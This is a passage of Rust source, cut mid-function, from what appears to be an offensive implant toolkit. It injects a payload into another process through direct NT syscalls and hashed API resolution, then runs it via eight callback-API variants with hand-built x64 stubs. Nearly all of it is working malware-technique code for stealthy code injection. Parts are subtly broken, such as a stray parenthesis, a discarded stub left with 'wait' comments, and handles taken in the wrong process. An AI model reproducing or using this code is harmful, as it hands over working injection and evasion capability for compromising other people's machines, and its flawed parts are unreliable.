        | PROCESS_QUERY_INFORMATION) as u64;
    let open_status = nt_syscall::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if open_status.is_err() || open_status.unwrap() < 0 || h_proc == 0 {
        return Err(InjectionError::InjectionFailed {
            technique,
            reason: "NtOpenProcess failed".to_string(),
        });
    }
    let h_proc = h_proc as *mut c_void;

    macro_rules! cleanup_and_err {
        ($msg:expr) => {{
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique,
                reason: $msg.to_string(),
            });
        }};
    }

    // ── Allocate RW memory for payload ──
    let mut remote_payload: *mut c_void = std::ptr::null_mut();
    let mut payload_size = payload.len();
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_payload as *mut _ as u64,
        0u64,
        &mut payload_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if s.is_err() || s.unwrap() < 0 || remote_payload.is_null() {
        cleanup_and_err!("NtAllocateVirtualMemory for payload failed");
    }

    // ── Write payload ──
    let mut written = 0usize;
    let s = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_payload as u64,
        payload.as_ptr() as u64,
        payload.len() as u64,
        &mut written as *mut _ as u64,
    );
    if s.is_err() || s.unwrap() < 0 || written != payload.len() {
        cleanup_and_err!("NtWriteVirtualMemory for payload failed");
    }

    // ── Flip payload to RX ──
    let mut old_prot = 0u32;
    let mut prot_base = remote_payload as usize;
    let mut prot_size = payload.len();
    let _ = nt_syscall::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );

    // ── Build and write the universal callback stub ──
    let stub = build_callback_stub(remote_payload as u64);

    // Allocate RW memory for stub
    let mut remote_stub: *mut c_void = std::ptr::null_mut();
    let mut stub_size = stub.len();
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_stub as *mut _ as u64,
        0u64,
        &mut stub_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if s.is_err() || s.unwrap() < 0 || remote_stub.is_null() {
        cleanup_and_err!("NtAllocateVirtualMemory for stub failed");
    }

    // Write stub
    let mut written = 0usize;
    let s = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_stub as u64,
        stub.as_ptr() as u64,
        stub.len() as u64,
        &mut written as *mut _ as u64,
    );
    if s.is_err() || s.unwrap() < 0 || written != stub.len() {
        cleanup_and_err!("NtWriteVirtualMemory for stub failed");
    }

    // Flip stub to RX
    let mut old_prot = 0u32;
    let mut prot_base = remote_stub as usize;
    let mut prot_size = stub.len();
    let _ = nt_syscall::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );

    // Flush I-cache for both regions.
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_payload as u64,
        payload.len() as u64,
    );
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_stub as u64,
        stub.len() as u64,
    );

    Ok((h_proc, remote_payload as usize, remote_stub as usize))
}

/// Helper: resolve a function from a DLL by its name hash.
///
/// First tries to find the DLL by its hashed name, then resolves the
/// function. Returns the function address or `None`.
unsafe fn resolve_dll_function(
    dll_hash: u32,
    func_name: &[u8],
) -> Option<usize> {
    let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
    pe_resolve::get_proc_address_by_hash(dll_base, pe_resolve::hash_str(func_name))
}

/// Helper: resolve a function from a DLL loaded by name.
///
/// If the DLL is not already loaded, attempts LoadLibraryA via pe_resolve.
/// Returns the function address or `None`.
unsafe fn resolve_external_dll_function(
    dll_name: &[u8],
    func_name: &[u8],
) -> Option<usize> {
    let dll_hash = pe_resolve::hash_str(dll_name);

    // Try to find already-loaded DLL first.
    if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
        return pe_resolve::get_proc_address_by_hash(
            base,
            pe_resolve::hash_str(func_name),
        );
    }

    // DLL not loaded — try LoadLibraryA.
    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
        b"kernel32.dll\0",
    ))?;
    let load_library_a = pe_resolve::get_proc_address_by_hash(
        kernel32,
        pe_resolve::hash_str(b"LoadLibraryA\0"),
    )?;

    let load_library: extern "system" fn(*const u8) -> *mut c_void =
        std::mem::transmute(load_library_a);

    let dll_base = load_library(dll_name.as_ptr());
    if dll_base.is_null() {
        return None;
    }

    pe_resolve::get_proc_address_by_hash(
        dll_base as usize,
        pe_resolve::hash_str(func_name),
    )
}

// ── Callback API Variant 1: EnumSystemLocalesA ───────────────────────────────

fn inject_callback_enum_system_locales(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumSystemLocalesA),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        // Resolve EnumSystemLocalesA from kernel32.
        let enum_func = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"EnumSystemLocalesA\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumSystemLocalesA".to_string(),
        })?;

        // BOOL EnumSystemLocalesA(LOCALE_ENUMPROCA lpLocaleEnumProc, DWORD dwFlags)
        // lpLocaleEnumProc = our stub address, dwFlags = 0 (enumerate all)
        let enum_sys_locales: extern "system" fn(usize, u32) -> i32 =
            std::mem::transmute(enum_func);

        // The callback runs in the target process context. We invoke the API
        // via a remote thread that calls EnumSystemLocalesA(stub_addr, 0).
        // Build a small caller stub: push args, call EnumSystemLocalesA, return.
        let mut caller = Vec::with_capacity(64);
        // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
        // mov rcx, stub_base  (first arg: callback)
        caller.extend_from_slice(&[0x48, 0xB9]);
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        // xor edx, edx (second arg: flags = 0)
        caller.extend_from_slice(&[0x31, 0xD2]);
        // mov rax, enum_func
        caller.extend_from_slice(&[0x48, 0xB8]);
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        // call rax
        caller.extend_from_slice(&[0xFF, 0xD0]);
        // add rsp, 0x28
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
        // ret
        caller.push(0xC3);

        // Write caller stub to target.
        let mut remote_caller: *mut c_void = std::ptr::null_mut();
        let mut caller_size = caller.len();
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        let _ = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_caller as *mut _ as u64,
            0u64,
            &mut caller_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        let mut written = 0usize;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_caller as u64,
            caller.as_ptr() as u64,
            caller.len() as u64,
            &mut written as *mut _ as u64,
        );
        let mut old_prot = 0u32;
        let mut prot_base = remote_caller as usize;
        let mut prot_size = caller.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            remote_caller as u64,
            caller.len() as u64,
        );

        // Execute the caller stub via a suspended thread.
        let h_thread = create_suspended_thread(h_proc, remote_caller as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 2: EnumWindows ──────────────────────────────────────

fn inject_callback_enum_windows(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumWindows),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let enum_func = resolve_dll_function(
            pe_resolve::hash_str(b"user32.dll\0"),
            b"EnumWindows\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumWindows".to_string(),
        })?;

        // Build caller stub: EnumWindows(stub_base, 0)
        let mut caller = Vec::with_capacity(48);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x31, 0xD2]); // xor edx, edx (lParam=0)
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumWindows
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        // Write and execute caller stub.
        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;

        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 3: EnumChildWindows ─────────────────────────────────

fn inject_callback_enum_child_windows(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumChildWindows),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let enum_func = resolve_dll_function(
            pe_resolve::hash_str(b"user32.dll\0"),
            b"EnumChildWindows\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumChildWindows".to_string(),
        })?;

        // GetDesktopWindow to get a valid HWND parent.
        let get_desktop = resolve_dll_function(
            pe_resolve::hash_str(b"user32.dll\0"),
            b"GetDesktopWindow\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve GetDesktopWindow".to_string(),
        })?;
        let get_desktop_wnd: extern "system" fn() -> usize =
            std::mem::transmute(get_desktop);
        let hwnd_desktop = get_desktop_wnd();

        // Build caller stub: EnumChildWindows(hwnd_desktop, stub_base, 0)
        let mut caller = Vec::with_capacity(64);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, hwnd
        caller.extend_from_slice(&(hwnd_desktop as u64).to_le_bytes());
        caller.extend_from_slice(&[0x48, 0xBA]); // mov rdx, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8d, r8d (lParam=0)
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumChildWindows
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 4: EnumDesktopWindows ───────────────────────────────

fn inject_callback_enum_desktop_windows(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumDesktopWindows),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let enum_func = resolve_dll_function(
            pe_resolve::hash_str(b"user32.dll\0"),
            b"EnumDesktopWindows\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumDesktopWindows".to_string(),
        })?;

        let get_thread_desktop = resolve_dll_function(
            pe_resolve::hash_str(b"user32.dll\0"),
            b"GetThreadDesktop\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve GetThreadDesktop".to_string(),
        })?;
        let get_current_thread_id = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"GetCurrentThreadId\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve GetCurrentThreadId".to_string(),
        })?;

        let get_tid: extern "system" fn() -> u32 = std::mem::transmute(get_current_thread_id);
        let get_tdesk: extern "system" fn(u32) -> usize = std::mem::transmute(get_thread_desktop);
        let hdesk = get_tdesk(get_tid());

        // Build caller stub: EnumDesktopWindows(hdesk, stub_base, 0)
        let mut caller = Vec::with_capacity(64);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, hdesk
        caller.extend_from_slice(&(hdesk as u64).to_le_bytes());
        caller.extend_from_slice(&[0x48, 0xBA]); // mov rdx, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8d, r8d
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumDesktopWindows
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 5: CreateTimerQueueTimer ────────────────────────────

fn inject_callback_create_timer_queue(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::CreateTimerQueueTimer),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let create_tqt = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"CreateTimerQueueTimer\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve CreateTimerQueueTimer".to_string(),
        })?;

        let delete_tqt = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"DeleteTimerQueueTimer\0",
        );

        // WT_EXECUTEONLYONCE = 0x00000008
        // CreateTimerQueueTimer(&hTimer, NULL, stub_base, NULL, 0, 0, 0x08)
        // DueTime=0 fires immediately. Period=0 means one-shot.
        let mut caller = Vec::with_capacity(96);

        // sub rsp, 0x38 (shadow + alignment for 7 args)
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // Allocate space for the timer handle (8 bytes on stack).
        // We'll use [rsp+0x30] as the timer handle storage.
        // lea rcx, [rsp+0x30]
        caller.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);
        // xor edx, edx (hQueue = NULL = default queue)
        caller.extend_from_slice(&[0x31, 0xD2]);
        // mov r8, stub_base (callback)
        caller.extend_from_slice(&[0x4C, 0x8B, 0xC0]); // will be overwritten
        // mov r8, imm64
        caller.extend_from_slice(&[0x49, 0xB8]);
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        // xor r9d, r9d (Parameter = NULL)
        caller.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // mov dword [rsp+0x20], 0 (DueTime = 0 = fire immediately)
        caller.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
        // mov dword [rsp+0x28], 0 (Period = 0 = one-shot)
        caller.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
        // mov dword [rsp+0x30], 0x08 (Flags = WT_EXECUTEONLYONCE) — wait, [rsp+0x30] is our timer handle slot
        // Actually we need 7 args. Let's re-layout:
        // arg1 (rcx) = &hTimer    → lea rcx, [rsp+0x28] (use rsp+0x28 for handle)
        // arg2 (rdx) = NULL (default timer queue)
        // arg3 (r8)  = stub_base (callback)
        // arg4 (r9)  = NULL (parameter)
        // arg5       = 0 (DueTime) → [rsp+0x20]
        // arg6       = 0 (Period)  → [rsp+0x28] — but [rsp+0x28] is handle storage
        // We need to reshuffle. Use a different layout:
        // Reserve 0x40 bytes of stack. Handle at [rsp+0x38].
        // Actually let's rebuild more carefully.

        caller.clear();
        // sub rsp, 0x40
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x40]);
        // lea rcx, [rsp+0x38]  → &hTimer (arg1)
        caller.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x38]);
        // xor edx, edx  → hQueue = NULL (arg2)
        caller.extend_from_slice(&[0x31, 0xD2]);
        // mov r8, imm64 → callback = stub_base (arg3)
        caller.extend_from_slice(&[0x49, 0xB8]);
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        // xor r9d, r9d → Parameter = NULL (arg4)
        caller.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // mov qword [rsp+0x20], 0 → DueTime = 0 (arg5, passed as DWORD)
        caller.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
        // mov qword [rsp+0x28], 0 → Period = 0 (arg6)
        caller.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
        // mov dword [rsp+0x30], 0x08 → Flags = WT_EXECUTEONLYONCE (arg7)
        caller.extend_from_slice(&[0xC7, 0x44, 0x24, 0x30, 0x08, 0x00, 0x00, 0x00]);
        // mov rax, CreateTimerQueueTimer
        caller.extend_from_slice(&[0x48, 0xB8]);
        caller.extend_from_slice(&(create_tqt as u64).to_le_bytes());
        // call rax
        caller.extend_from_slice(&[0xFF, 0xD0]);

        // If DeleteTimerQueueTimer is available, clean up.
        // Otherwise just skip.
        if let Some(delete_fn) = delete_tqt {
            // mov rcx, [rsp+0x38]  → hTimer (arg1)
            // Wait, we need to pass NULL for hQueue since we used default.
            // But the handle might be 0 if CreateTimerQueueTimer failed.
            // mov rcx, 0  → hQueue = NULL (use default, invalid for delete but OK)
            // mov rdx, [rsp+0x38] → hTimer
            // Actually DeleteTimerQueueTimer(NULL, hTimer, NULL):
            //   rcx = TimerQueue = NULL
            //   rdx = Timer = [rsp+0x38]
            //   r8  = Event = NULL
            caller.extend_from_slice(&[0x31, 0xC9]); // xor ecx, ecx
            caller.extend_from_slice(&[0x48, 0x8B, 0x54, 0x24, 0x38]); // mov rdx, [rsp+0x38]
            caller.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d
            caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, DeleteTimerQueueTimer
            caller.extend_from_slice(&(delete_fn as u64).to_le_bytes());
            caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        }

        // add rsp, 0x40
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x40]);
        // ret
        caller.push(0xC3);

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 6: EnumTimeFormatsA ─────────────────────────────────

fn inject_callback_enum_time_formats(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumTimeFormatsA),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let enum_func = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"EnumTimeFormatsA\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumTimeFormatsA".to_string(),
        })?;

        // LOCALE_USER_DEFAULT = 0x0400
        // EnumTimeFormatsA(stub_base, 0x0400, 0)
        let mut caller = Vec::with_capacity(48);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        // mov edx, 0x0400 (LOCALE_USER_DEFAULT)
        caller.extend_from_slice(&[0xBA, 0x00, 0x04, 0x00, 0x00]);
        caller.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8d, r8d (reserved)
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumTimeFormatsA
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 7: EnumResourceTypesW ───────────────────────────────

fn inject_callback_enum_resource_types(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumResourceTypesW),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let enum_func = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"EnumResourceTypesW\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumResourceTypesW".to_string(),
        })?;

        let get_module_handle = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"GetModuleHandleW\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve GetModuleHandleW".to_string(),
        })?;

        // GetModuleHandleW(NULL) → hModule of current process
        let get_mod_h: extern "system" fn(*const u16) -> usize =
            std::mem::transmute(get_module_handle);
        let h_module = get_mod_h(std::ptr::null());

        // EnumResourceTypesW(hModule, stub_base, 0)
        let mut caller = Vec::with_capacity(48);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, hModule
        caller.extend_from_slice(&(h_module as u64).to_le_bytes());
        caller.extend_from_slice(&[0x48, 0xBA]); // mov rdx, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8d, r8d (lParam=0)
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumResourceTypesW
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 8: EnumFontFamilies ─────────────────────────────────

fn inject_callback_enum_font_families(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumFontFamilies),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let enum_func = resolve_dll_function(
            pe_resolve::hash_str(b"gdi32.dll\0"),
            b"EnumFontFamiliesExW\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumFontFamiliesExW".to_string(),
        })?;

        let get_dc = resolve_dll_function(
            pe_resolve::hash_str(b"user32.dll\0"),
            b"GetDC\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve GetDC".to_string(),
        })?;

        let release_dc = resolve_dll_function(
            pe_resolve::hash_str(b"user32.dll\0"),
            b"ReleaseDC\0",
        );

        // GetDC(NULL) → screen DC
        let get_dc_fn: extern "system" fn(*mut c_void) -> *mut c_void =
            std::mem::transmute(get_dc);
        let hdc = get_dc_fn(std::ptr::null_mut());

        // We need a LOGFONT structure with lfFaceName[0]=0 (enumerate all).
        // LOGFONTW is 92 bytes on x64. We'll write it into the target process.
        // For simplicity, allocate 128 bytes and zero it (LOGFONTW with lfCharSet=DEFAULT_CHARSET).
        let mut logfont = vec![0u8; 128];
        // lfCharSet at offset 23 = DEFAULT_CHARSET (1) — actually DEFAULT_CHARSET = 1
        // But 0 (ANSI_CHARSET) works too for "enumerate all fonts".
        // Let's set lfFaceName[0] = 0 and lfCharSet = 0 (already zeroed).

        // Allocate RW memory for LOGFONT in target.
        let mut remote_lf: *mut c_void = std::ptr::null_mut();
        let mut lf_size = logfont.len();
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
        let _ = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_lf as *mut _ as u64,
            0u64,
            &mut lf_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        let mut written = 0usize;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_lf as u64,
            logfont.as_ptr() as u64,
            logfont.len() as u64,
            &mut written as *mut _ as u64,
        );

        // Build caller stub:
        // EnumFontFamiliesExW(hdc, &logfont, stub_base, 0, 0)
        let mut caller = Vec::with_capacity(64);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, hdc
        caller.extend_from_slice(&(hdc as u64).to_le_bytes());
        caller.extend_from_slice(&[0x48, 0xBA]); // mov rdx, remote_lf
        caller.extend_from_slice(&(remote_lf as u64).to_le_bytes());
        caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (lParam=0)
        // mov dword [rsp+0x20], 0 (dwFlags=0)
